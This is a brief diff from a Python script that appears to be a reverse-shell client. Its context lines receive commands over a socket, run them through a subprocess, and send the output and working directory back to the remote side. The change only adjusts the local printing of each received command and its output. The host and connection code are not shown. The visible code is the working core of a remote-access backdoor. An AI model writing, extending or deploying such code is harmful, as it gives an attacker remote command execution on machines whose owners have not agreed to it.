@@ -16,7 +16,8 @@ while True:
 		output_bytes = cmd.stdout.read() + cmd.stderr.read()
 		output_str = str(output_bytes, "utf-8")
 		s.send(str.encode(output_str + str(os.getcwd())+ '> '))
-		print(output_str)
+		print(str(os.getcwd()) + '> ' + str(data[:], "utf-8"))
+		print(output_str.rstrip('\n'))
 
 # Close connection
 s.close()
